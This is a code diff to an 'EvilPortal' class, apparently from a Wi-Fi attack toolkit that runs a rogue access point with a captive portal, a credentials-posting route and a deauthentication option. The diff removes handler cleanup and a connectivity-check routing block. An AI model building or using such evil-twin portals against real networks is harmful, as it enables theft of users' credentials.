@@ -16,12 +16,6 @@ EvilPortal::EvilPortal(String tssid, uint8_t channel, bool deauth, bool verifyPw
 };
 
 EvilPortal::~EvilPortal() {
-    // Clean up handler to prevent memory leak
-    if (_captiveHandler) {
-        webServer.removeHandler(_captiveHandler);
-        delete _captiveHandler;
-        _captiveHandler = nullptr;
-    }
     webServer.end();
     dnsServer.stop();
     vTaskDelay(100 / portTICK_PERIOD_MS);
@@ -184,29 +178,6 @@ void EvilPortal::setupRoutes() {
         request->send(response);
     });
 
-    webServer.on("^\\/(.*)$", HTTP_GET, [this](AsyncWebServerRequest *request) {
-        String url = request->url();
-        if (url == "/" || 
-            url == "/generate_204" || 
-            url == "/gen_204" ||
-            url == "/hotspot-detect.html" ||
-            url == "/library/test/success.html" ||
-            url == "/ncsi.txt" ||
-            url == "/connecttest.txt" ||
-            url == "/redirect" ||
-            url == "/success.txt" ||
-            url == "/canonical.html" ||
-            url == "/fwlink" ||
-            url.indexOf("detectportal") != -1 ||
-            url.indexOf("connecttest") != -1 ||
-            url.indexOf("msftconnecttest") != -1 ||
-            url.indexOf("clients3.google.com") != -1) {
-            request->send(404);
-        } else {
-            portalController(request);
-        }
-    });
-
     webServer.on("/", [this](AsyncWebServerRequest *request) { portalController(request); });
     webServer.on("/post", [this](AsyncWebServerRequest *request) { credsController(request); });
     
@@ -250,27 +221,16 @@ void EvilPortal::setupRoutes() {
         }
     });
 
-    // Store handler pointer for cleanup
-    _captiveHandler = new CaptiveRequestHandler(this);
-    webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
+    webServer.addHandler(new CaptiveRequestHandler(this)).setFilter(ON_AP_FILTER);
 }
 
 void EvilPortal::restartWiFi(bool reset) {
-    // Clean up old handler before restart
-    if (_captiveHandler) {
-        webServer.removeHandler(_captiveHandler);
-        delete _captiveHandler;
-        _captiveHandler = nullptr;
-    }
-    
     webServer.end();
     wifiDisconnect();
     WiFi.softAP(apName);
     webServer.begin();
     
-    // Re-add handler
-    _captiveHandler = new CaptiveRequestHandler(this);
-    webServer.addHandler(_captiveHandler).setFilter(ON_AP_FILTER);
+    webServer.addHandler(new CaptiveRequestHandler(this)).setFilter(ON_AP_FILTER);
     
     if (reset) resetCapturedCredentials();
 }
